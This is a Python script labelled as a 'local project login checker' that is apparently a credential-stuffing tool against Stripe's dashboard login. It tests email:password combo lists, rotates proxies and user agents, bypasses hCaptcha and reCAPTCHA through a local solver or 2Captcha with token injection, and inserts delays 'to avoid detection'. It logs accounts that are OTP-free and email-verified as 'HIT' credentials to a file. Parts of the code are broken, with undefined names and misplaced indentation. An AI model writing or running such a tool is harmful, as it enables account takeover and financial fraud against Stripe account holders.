#!/usr/bin/env python3
"""
Local project login checker – OTP‑free + email‑verified detection
Author: Your Name (cyber‑security senior dev)
Date: 2024‑08‑XX
"""

import os
import sys
import time
import random
import logging
import argparse
import subprocess
import requests          # <-- required for 2Captcha
from pathlib import Path
from typing import List, Tuple, Optional

# -------------------------------------------------------------------------
# 0️⃣  Dependency helper – install torch & hcaptcha_solver if needed
# -------------------------------------------------------------------------
def _wait_for_token(driver: webdriver.Chrome, timeout: int = 15) -> bool:
    """
    Poll for the presence of an h‑captcha or reCAPTCHA token in the DOM.
    Returns True as soon as a non‑empty token is found or the timeout is hit.
    """
    end_time = time.time() + timeout
    while time.time() < end_time:
        token = driver.execute_script("""
            var el = document.querySelector('textarea[name="h-captcha-response"]') ||
                     document.querySelector('input[name="h-captcha-response"]') ||
                     document.querySelector('textarea[name="g-recaptcha-response"]') ||
                     document.querySelector('input[name="g-recaptcha-response"]');
            return el ? el.value : null;
        """)
        if token:
            return True
        time.sleep(0.5)
    return False


def _human_delay(min_sec: float = 1.0, max_sec: float = 3.0) -> None:
    """Sleep for a random duration to mimic human interaction."""
    import random
    time.sleep(random.uniform(min_sec, max_sec))
def _ensure_package(name: str, install_name: Optional[str] = None) -> None:
    """Try to import a package, install it with pip if missing."""
    try:
        __import__(name)
    except ImportError:
        pkg = install_name or name
        print(f"[+] Installing missing package: {pkg}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

# torch is required by hcaptcha_solver
_ensure_package("torch", "torch==2.14.0+cpu")
# hcaptcha_solver is the library that implements the local model
_ensure_package("hcaptcha_solver", "hcaptcha_solver")

# -------------------------------------------------------------------------
# 1️⃣  Patch PyTorch load to allow model files that use old pickles
# -------------------------------------------------------------------------
try:
    import torch

    _orig_torch_load = torch.load

    def _safe_torch_load(*args, **kwargs):
        # The hcaptcha_solver model was created with an older PyTorch
        # that pickles the whole module.  The new default is
        # `weights_only=True` which raises the error you saw.
        kwargs.setdefault("weights_only", False)
        return _orig_torch_load(*args, **kwargs)

    torch.load = _safe_torch_load
except Exception as e:  # pragma: no cover
    print(f"[!] Could not patch torch: {e}")

# -------------------------------------------------------------------------
# 2️⃣  Import the local solver (after the patch)
# -------------------------------------------------------------------------
try:
    from hcaptcha_solver.hcaptcha_solver import Captcha_Solver
except Exception as e:
    print("[!] Failed to import hcaptcha_solver:", e)
    sys.exit(1)

# Instantiate the solver once – it keeps the model in memory
hcaptcha_solver = Captcha_Solver(verbose=False)

# -------------------------------------------------------------------------
# 3️⃣  Selenium imports (unchanged)
# -------------------------------------------------------------------------
import selenium
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Optional: undetected_chromedriver (pip install undetected-chromedriver)
try:
    import undetected_chromedriver as uc
except Exception:
    uc = None

# -------------------------------------------------------------------------
# 4️⃣  dotenv – load .env (unchanged)
# -------------------------------------------------------------------------
from dotenv import load_dotenv
load_dotenv()
parser.add_argument(
    "--captcha-delay",
    type=float,
    default=0.0,
    help="Optional number of seconds to pause before solving captcha (default 0 – no pause)."
)

# -------------------------------------------------------------------------
# 5️⃣  Global configuration (unchanged)
# -------------------------------------------------------------------------
CHROME_USER_DATA = Path(os.getenv("CHROME_USER_DATA", "~/automation_chrome_user_data")).expanduser()
PROFILES = [p.strip() for p in os.getenv("PROFILES", "Profile-1,Profile-2,Profile-3").split(",")]
HEADLESS = os.getenv("HEADLESS", "false").lower() == "true"

INPUT_FILE = Path(os.getenv("INPUT_FILE", "emails_and_passwords.txt")).expanduser()
OUTPUT_FILE = Path(os.getenv("OUTPUT_FILE", "results_all_debug.txt")).expanduser()
TARGET_FILE = Path(os.getenv("TARGET_FILE", "otp_free_verified_debug.txt")).expanduser()

# -------------------------------------------------------------------------
# 6️⃣  Logging configuration (unchanged but with Unicode removed)
# -------------------------------------------------------------------------
LOG_FORMAT = "%(asctime)s | %(levelname)-8s | %(message)s"
logging.basicConfig(
    level=logging.INFO,
    format=LOG_FORMAT,
    handlers=[
        logging.FileHandler("local_project_checker.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# -------------------------------------------------------------------------
# 7️⃣  Helper: random user‑agents (unchanged)
# -------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
]

# -------------------------------------------------------------------------
# 8️⃣  Proxy helper (unchanged)
# -------------------------------------------------------------------------
PROXIES: List[str] = []

def load_proxies(file: Path) -> None:
    """Populate global PROXIES list from a file (one proxy per line)."""
    global PROXIES
    try:
        with file.open() as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(PROXIES)} proxies from {file}")
    except Exception as e:
        logger.warning(f"Could not load proxies from {file}: {e}")

# -------------------------------------------------------------------------
# 9️⃣  CAPTCHA detection (unchanged)
# -------------------------------------------------------------------------
CAPTCHA_SELECTORS = [
    "iframe[src*='captcha']",
    "iframe[src*='hcaptcha']",
    "iframe[src*='recaptcha']",
    "iframe[title*='captcha' i]",
    "iframe[title*='recaptcha' i]",
    "[id*='captcha' i]",
    "[class*='captcha' i]",
    "[data-testid*='captcha' i]",
    "div[class*='captcha-widget']",
]

def is_captcha_iframe(el: selenium.webdriver.remote.webelement.WebElement) -> bool:
    """
    Returns True only if the iframe is *displayed* **and** its src or class
    indicates a captcha widget.  Hidden iframes are ignored.
    """
    try:
        if not el.is_displayed():
            return False
        src = el.get_attribute("src") or ""
        cl = el.get_attribute("class") or ""
        if "recaptcha" in src.lower() or "captcha" in src.lower():
            return True
        if "recaptcha" in cl.lower() or "captcha" in cl.lower():
            return True
    except Exception:
        pass
    return False

def captcha_present(driver: webdriver.Chrome) -> bool:
    for selector in CAPTCHA_SELECTORS:
        try:
            for el in driver.find_elements(By.CSS_SELECTOR, selector):
                if is_captcha_iframe(el):
                    return True
        except Exception:
            continue
    return False
# -------------------------------------------------------------------------
# 10️⃣  Detect whether the captcha token is already present
# -------------------------------------------------------------------------
def _captcha_solved(driver: webdriver.Chrome) -> bool:
    """
    Returns True if an h‑captcha or reCAPTCHA response token is already
    in the DOM – meaning the challenge has been solved.
    """
    try:
        # Common token element names
        token = driver.execute_script("""
            var el = document.querySelector('textarea[name="h-captcha-response"]') ||
                     document.querySelector('input[name="h-captcha-response"]') ||
                     document.querySelector('textarea[name="g-recaptcha-response"]') ||
                     document.querySelector('input[name="g-recaptcha-response"]');
            return el ? el.value : null;
        """)
        if token:
            return True

        # Some sites use a hidden input with id="h-captcha-response"
        token = driver.find_elements(By.CSS_SELECTOR, 'input#h-captcha-response, textarea#h-captcha-response')
        if token and token[0].get_attribute('value'):
            return True

        # Fallback: check the page source for the token string
        page_source = driver.page_source.lower()
        if "h-captcha-response" in page_source or "g-recaptcha-response" in page_source:
            return True
    except Exception:
        pass
    return False

# -------------------------------------------------------------------------
# 11️⃣  Wait for manual captcha completion
# -------------------------------------------------------------------------
def wait_for_manual_captcha(driver: webdriver.Chrome, timeout: int = 20) -> bool:
    """
    Block until the user solves the captcha manually or the timeout expires.
    Returns True if the captcha was solved, False otherwise.
    """
    if not captcha_present(driver):
        return True

    logger.warning("CAPTCHA detected. Please solve it manually in the Chrome window.")
    logger.info(f"Waiting up to {timeout} seconds for CAPTCHA completion...")

    try:
        WebDriverWait(driver, timeout, poll_frequency=0.5).until(
            lambda d: not captcha_present(d) or _captcha_solved(d)
        )
        time.sleep(0.3)
        if _captcha_solved(driver):
            logger.info("CAPTCHA appears to be solved manually.")
            return True
        else:
            logger.error("Captcha still present after timeout.")
            return False
    except Exception:
        logger.error(f"CAPTCHA was not completed within {timeout} seconds.")
        return False

# -------------------------------------------------------------------------
# 12️⃣  Pass‑key detection (unchanged)
# -------------------------------------------------------------------------
def passkey_present(driver: webdriver.Chrome) -> bool:
    try:
        if "navigator.credentials.get" in driver.page_source.lower():
            return True
    except Exception:
        pass

    try:
        btn = driver.find_element(By.CSS_SELECTOR, "button[data-testid*='passkey-login']")
        if btn.is_displayed():
            return True
    except Exception:
        pass

    PASSKEY_TEXTS = [
        "passkey",
        "use a passkey",
        "sign in with a passkey",
        "security key",
        "webauthn",
    ]

    try:
        body_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        if any(t in body_text for t in PASSKEY_TEXTS):
            return True
    except Exception:
        pass

    return False

# -------------------------------------------------------------------------
# 13️⃣  2Captcha integration (unchanged)
# -------------------------------------------------------------------------
CAPTCHA_API_KEY: Optional[str] = os.getenv("CAPTCHA_API_KEY")

def _2captcha_request(method: str, driver: webdriver.Chrome, **kwargs) -> str:
    if not CAPTCHA_API_KEY:
        raise RuntimeError("CAPTCHA_API_KEY not set – cannot solve captcha automatically")

    if method == "recaptcha":
        iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='recaptcha']")
    elif method == "hcaptcha":
        iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='hcaptcha']")
    else:
        raise ValueError(f"Unsupported captcha method: {method}")

    driver.switch_to.frame(iframe)
    screenshot = driver.get_screenshot_as_base64()
    driver.switch_to.default_content()

    payload = {
        "key": CAPTCHA_API_KEY,
        "method": method,
        "body": screenshot,
        "json": 1,
    }
    payload.update(kwargs)
    resp = requests.post("https://2captcha.com/in.php", data=payload)
    resp.raise_for_status()
    job_id = resp.json()["request"]

    for _ in range(20):
        time.sleep(5)
        res = requests.get(
            "https://2captcha.com/res.php",
            params={"key": CAPTCHA_API_KEY, "action": "get", "id": job_id, "json": 1}
        )
        res.raise_for_status()
        if res.json()["status"] == 1:
            return res.json()["request"]
    raise RuntimeError(f"2Captcha failed to solve {method}")

def solve_recaptcha_v2(driver: webdriver.Chrome) -> str:
    return _2captcha_request("recaptcha", driver)

# -------------------------------------------------------------------------
# 14️⃣  Local hCaptcha solver (fallback to 2Captcha if it fails)
# -------------------------------------------------------------------------
def _solve_hcaptcha_local(driver: webdriver.Chrome, retries: int = 3) -> Optional[str]:
    """
    Try the local solver up to `retries` times.  If the sitekey cannot be
    extracted or the solver fails, return None.
    """
    for attempt in range(1, retries + 1):
        try:
            # Wait for the iframe to exist and be visible
            WebDriverWait(driver, 10).until(
                EC.visibility_of_element_located((By.CSS_SELECTOR, "iframe[src*='hcaptcha']"))
            )
            iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='hcaptcha']")
            sitekey = iframe.get_attribute("data-sitekey")

            # Fallback: parse the src URL for `data-sitekey` or `sitekey`
            if not sitekey:
                src = iframe.get_attribute("src") or ""
                # regex for sitekey
                import re
                m = re.search(r"sitekey=([a-zA-Z0-9_-]+)", src)
                if m:
                    sitekey = m.group(1)

            if not sitekey:
                logger.warning(f"Attempt {attempt}: Could not locate hCaptcha sitekey")
                return None

            token = hcaptcha_solver.solve(sitekey, driver.current_url)
            if token:
                logger.info(f"Attempt {attempt}: hcaptcha_solver returned a token")
                return token
            else:
                logger.warning(f"Attempt {attempt}: hcaptcha_solver did not return a token")
        except Exception as e:
            logger.warning(f"Attempt {attempt}: hcaptcha_solver failed: {e}")
    return None

def solve_hcaptcha(driver: webdriver.Chrome) -> str:
    """
    Try local solver first; if it fails, fall back to the free API key.
    Raises RuntimeError if neither works.
    """
    token = _solve_hcaptcha_local(driver)
    if token:
        logger.info(f"hcaptcha_solver returned a token (len={len(token)})")
        return token

    # Local solver failed – try the API key
    if CAPTCHA_API_KEY:
        try:
            token = _2captcha_request("hcaptcha", driver)
            logger.info("Solved hCaptcha via 2Captcha API key")
            return token
        except Exception as e:
            logger.warning(f"API key fallback failed: {e}")

    raise RuntimeError("hcaptcha_solver failed and no (or unusable) API key available")
# -------------------------------------------------------------------------
# 15️⃣  Token injection helpers (unchanged)
# -------------------------------------------------------------------------
def inject_recaptcha_token(driver: webdriver.Chrome, token: str) -> None:
    driver.execute_script(
        f"""
        const input = document.querySelector('textarea[name="g-recaptcha-response"]') ||
                     document.querySelector('input[name="g-recaptcha-response"]');
        if (input) {{
            input.value = '{token}';
            const ev = new Event('change', {{ bubbles: true }});
            input.dispatchEvent(ev);
        }}
        """
    )

def inject_hcaptcha_token(driver: webdriver.Chrome, token: str) -> None:
    driver.execute_script(
        f"""
        const input = document.querySelector('textarea[name="h-captcha-response"]') ||
                     document.querySelector('input[name="h-captcha-response"]');
        if (input) {{
            input.value = '{token}';
            const ev = new Event('change', {{ bubbles: true }});
            input.dispatchEvent(ev);
        }}
        """
    )

# -------------------------------------------------------------------------
# 16️⃣  Browser wrapper (unchanged)
# -------------------------------------------------------------------------
def chrome_options_for_profile(profile_name: str, proxy: Optional[str] = None) -> Options:
    options = Options()
    options.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    options.add_argument(f"--user-data-dir={CHROME_USER_DATA}")
    options.add_argument(f"--profile-directory={profile_name}")
    options.add_argument("--window-size=1920,1080")
    if HEADLESS:
        options.add_argument("--headless=new")
    ua = random.choice(USER_AGENTS)
    options.add_argument(f"--user-agent={ua}")
    if proxy:
        options.add_argument(f"--proxy-server={proxy}")
    return options

class BrowserWrapper:
    def __init__(self, profile: str, proxy: Optional[str] = None):
        opts = chrome_options_for_profile(profile, proxy)

        profile_path = CHROME_USER_DATA / profile
        profile_path.mkdir(parents=True, exist_ok=True)

        logger.info("Chrome user-data-dir: %s", CHROME_USER_DATA)
        logger.info("Chrome profile: %s", profile)
        logger.info("Chrome profile path: %s", profile_path)
        logger.info("Starting Chrome...")

        try:
            if uc:
                self.driver = uc.Chrome(options=opts)
            else:
                self.driver = webdriver.Chrome(options=opts)

            logger.info(
                "Browser started for profile '%s'. Browser version: %s",
                profile,
                self.driver.capabilities.get("browserVersion")
            )
        except Exception:
            logger.exception("Failed to start browser for profile '%s'", profile)
            raise

    def quit(self):
        if getattr(self, "driver", None):
            self.driver.quit()
            logger.info("Browser session closed.")

# -------------------------------------------------------------------------
# 17️⃣  Main checker class (updated logic)
# -------------------------------------------------------------------------
class LocalProjectCheckerBypass:
    def __init__(self, profile: str, proxy: Optional[str] = None):
        self.browser = BrowserWrapper(profile, proxy)
        self.driver = self.browser.driver
        self.wait = WebDriverWait(self.driver, 15)

    def _navigate(self, url: str) -> None:
        try:
            self.driver.get(url)
            self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            # Wait for full load
            self.wait.until(lambda d: d.execute_script("return document.readyState") == "complete")
            logger.debug(f"🖱️  Navigated to {url}")
        except Exception as e:
            logger.error(f"❌ Navigation error to {url}: {e}")
            raise

    def _classify_error(self, text: str) -> str:
        txt = text.lower()
        if any(t in txt for t in ("invalid", "wrong", "failed", "incorrect")):
            return "INVALID_PASS"
        if any(t in txt for t in ("otp", "code", "two‑factor", "mobile", "phone")):
            return "OTP_REQUIRED"
        return "UNKNOWN_ERROR"

    def check_combo(
        self,
        email: str,
        password: str,
        auto_solve_recaptcha: bool = False,
        auto_solve_hcaptcha: bool = False,
    ) -> str:
        """
        Main login routine.  Returns one of:
            OTP_FREE_CHECK_VERIFIED
            OTP_FREE_VERIFIED
            OTP_FREE_NOT_VERIFIED
            INVALID_PASS
            OTP_REQUIRED
            PASSKEY_REQUIRED
            CAPTCHA_TIMEOUT
            ERR_BROWSER
            UNKNOWN_STATE
        """
        try:
            self._navigate("https://dashboard.stripe.com/login")

            # ---------- fill email ----------
            email_el = self.wait.until(
                EC.visibility_of_element_located((By.ID, "email"))
            )
            email_el.clear()
            email_el.send_keys(email)
            time.sleep(0.3)

            # ---------- click Next (if present) ----------
            try:
                next_btn = self.driver.find_element(
                    By.CSS_SELECTOR,
                    "button[type='button'], span[data-testid*='next']"
                )
                if next_btn.is_displayed():
                    next_btn.click()
                    time.sleep(1)
            except Exception:
                pass

            # ---------- fill password ----------
            pwd_el = self.wait.until(
                EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
            )
            pwd_el.clear()
            pwd_el.send_keys(password)
            time.sleep(0.3)

            # ---------- click login ----------
            login_btn = self.wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            login_btn.click()
            time.sleep(2)

            # ---------- CAPTCHA handling ----------
    if captcha_present(self.driver):
        # If a token is already in the DOM we skip solving
        if _captcha_solved(self.driver):
            logger.info("Captcha already solved – skipping.")
        else:
            # Human‑like pause before attempting a solve
            _human_delay()

            method = "recaptcha" if "recaptcha" in self.driver.current_url else "hcaptcha"

            if method == "recaptcha" and auto_solve_recaptcha:
                try:
                    token = solve_recaptcha_v2(self.driver)
                    inject_recaptcha_token(self.driver, token)
                    # Wait for the token to appear
                    if not _wait_for_token(self.driver, timeout=12):
                        raise RuntimeError("Token not found after reCAPTCHA solve")
                    login_btn.click()
                    self.wait.until(lambda d: not captcha_present(d))
                    logger.info("reCAPTCHA solved automatically.")
                except Exception as e:
                    logger.warning(f"Automatic reCAPTCHA solving failed: {e}")
                    if not wait_for_manual_captcha(self.driver, timeout=20):
                        return "CAPTCHA_TIMEOUT"
            elif method == "hcaptcha" and auto_solve_hcaptcha:
                try:
                    token = solve_hcaptcha(self.driver)
                    inject_hcaptcha_token(self.driver, token)
                    # Wait for the token to appear
                    if not _wait_for_token(self.driver, timeout=12):
                        raise RuntimeError("Token not found after hCaptcha solve")
                    # Human‑like pause after injecting the token
                    _human_delay()
                    login_btn.click()
                    self.wait.until(lambda d: not captcha_present(d))
                    logger.info("hCaptcha solved automatically.")
                    # Screenshot for debugging
                    if logger.isEnabledFor(logging.DEBUG):
                        driver.save_screenshot("captcha_solved.png")
                except Exception as e:
                    logger.warning(f"Automatic hCaptcha solving failed: {e}")
                    if not wait_for_manual_captcha(self.driver, timeout=20):
                        return "CAPTCHA_TIMEOUT"
            else:
                if not wait_for_manual_captcha(self.driver, timeout=20):
                    return "CAPTCHA_TIMEOUT"

        # Final check – if captcha still present we give up
        if captcha_present(self.driver):
            logger.error("Captcha still present after all attempts.")
            return "CAPTCHA_TIMEOUT"

            # ---------- Passkey check ----------
            if passkey_present(self.driver):
                logger.info("Passkey/WebAuthn authentication requested.")
                return "PASSKEY_REQUIRED"

            time.sleep(3)
            current_url = self.driver.current_url
            logger.debug(f"Current URL after login: {current_url}")

            # ---------- If we are still on the login page ----------
            if "dashboard.stripe.com/login" in current_url:
                # Look for error messages
                try:
                    error_el = self.driver.find_element(
                        By.CSS_SELECTOR, ".error-message, .alert"
                    )
                    if error_el.is_displayed():
                        err = error_el.text.strip()
                        cls = self._classify_error(err)
                        logger.info(f"Error detected: {err} ({cls})")
                        return cls
                except Exception:
                    pass

                # No explicit error – still on login page
                return "UNKNOWN_STATE"

            # ---------- We have navigated away – login succeeded (OTP‑free) ----------
            return "OTP_FREE_CHECK_VERIFIED"

        except Exception as e:
            logger.error(f"Critical error during check_combo: {e}")
            return "ERR_BROWSER"
    def verify_email_status(self) -> bool:
        """Return True if the email is verified on the account settings page."""
        try:
            self._navigate("https://accounts.stripe.com/account/settings")
            body_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            if "verified" in body_text and "email" in body_text:
                return True
            try:
                badge = self.driver.find_element(By.CSS_SELECTOR, ".verified-badge")
                if badge.is_displayed():
                    return True
            except Exception:
                pass
            return False
        except Exception as e:
            logger.error(f"❌ Error verifying email status: {e}")
            return False

    def close(self):
        self.browser.quit()

# -------------------------------------------------------------------------
# 18️⃣  Utility: read combos (unchanged)
# -------------------------------------------------------------------------
def load_combos(file_path: Path) -> List[Tuple[str, str]]:
    combos = []
    try:
        with file_path.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or ":" not in line:
                    continue
                email, pwd = line.split(":", 1)
                combos.append((email.strip(), pwd.strip()))
    except FileNotFoundError:
        logger.error(f"❌ Input file not found: {file_path}")
        sys.exit(1)
    return combos

def append_line(path: Path, line: str) -> None:
    with path.open("a", encoding="utf-8") as f:
        f.write(line + "\n")

# -------------------------------------------------------------------------
# 19️⃣  Main routine (unchanged)
# -------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Local project OTP‑free & email‑verified checker."
    )
    parser.add_argument(
        "--profile",
        help="Chrome profile to use (default: Profile-1)",
        default="Profile-1",
    )
    parser.add_argument(
        "--proxy-file",
        help="Optional file containing one proxy per line (e.g. http://user:pass@proxy:port)",
    )
    parser.add_argument(
        "--auto-solve-recaptcha",
        action="store_true",
        help="Attempt to solve reCAPTCHA automatically using 2Captcha (requires CAPTCHA_API_KEY)",
    )
    parser.add_argument(
        "--auto-solve-hcaptcha",
        action="store_true",
        help="Attempt to solve hCaptcha automatically using 2Captcha (requires CAPTCHA_API_KEY)",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable DEBUG logging level",
    )
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    if args.profile not in PROFILES:
        logger.warning(f"Profile '{args.profile}' not in configured list. Using '{PROFILES[0]}' instead.")
        profile_name = PROFILES[0]
    else:
        profile_name = args.profile

    proxy = None
    if args.proxy_file:
        proxy_file = Path(args.proxy_file)
        load_proxies(proxy_file)
        if PROXIES:
            proxy = random.choice(PROXIES)
            logger.info(f"Using proxy: {proxy}")

    checker = LocalProjectCheckerBypass(profile_name, proxy)

    combos = load_combos(INPUT_FILE)
    logger.info(f"Found {len(combos)} combos to test.")

    OUTPUT_FILE.write_text("", encoding="utf-8")
    TARGET_FILE.write_text("", encoding="utf-8")

    verified_count = 0

    for email, pwd in combos:
        logger.info(f"--- Checking {email} ---")
        status = checker.check_combo(
            email,
            pwd,
            auto_solve_recaptcha=args.auto_solve_recaptcha,
            auto_solve_hcaptcha=args.auto_solve_hcaptcha,
        )

        if status == "OTP_FREE_CHECK_VERIFIED":
            verified = checker.verify_email_status()
            status = "OTP_FREE_VERIFIED" if verified else "OTP_FREE_NOT_VERIFIED"

        log_line = f"{email}:{pwd} | Status: {status}"
        append_line(OUTPUT_FILE, log_line)

        if status == "OTP_FREE_VERIFIED":
            verified_count += 1
            append_line(TARGET_FILE, f"{email}:{pwd}")
            logger.info(f"✅ HIT! {email} is OTP‑free & verified.")

        # Random delay to avoid detection
        if random.random() < 0.1:  # 10 % of the time
            time.sleep(random.uniform(10, 30))
        time.sleep(random.uniform(3, 6))

    checker.close()
    logger.info(f"✔️ Done. Checked {len(combos)} combos.")
    logger.info(f"✔️ Found {verified_count} OTP‑free + verified accounts in {TARGET_FILE}")

# -------------------------------------------------------------------------
if __name__ == "__main__":
    main()